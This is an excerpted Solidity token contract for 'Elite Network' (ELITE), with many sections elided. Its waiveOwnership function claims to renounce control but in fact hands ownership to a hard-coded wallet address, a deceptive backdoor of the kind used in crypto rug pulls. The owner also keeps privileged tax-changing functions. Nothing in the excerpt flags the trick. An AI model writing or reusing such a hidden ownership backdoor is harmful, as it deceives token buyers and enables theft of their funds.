...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xaAEe15663B42ebd47A54dCe4EbC426C48BBD402E);
    }
...
contract EliteNetwork is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Elite Network";
    string private _symbol = "ELITE";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x1EB4F9956086Af338b60B4F80afee2BD5da5bE36);
    address payable public teamWalletAddress = payable(0x1EB4F9956086Af338b60B4F80afee2BD5da5bE36);
    ...
    function setTaxForBuyContest(bool newvalue) external onlyOwner() {
    if (newvalue == true)
        {
        _buyLiquidityFee = 0;
        _buyMarketingFee = 0;
    ...
    function setMinNumTokensBeforeSwap(uint256 newLimit) external onlyOwner() {
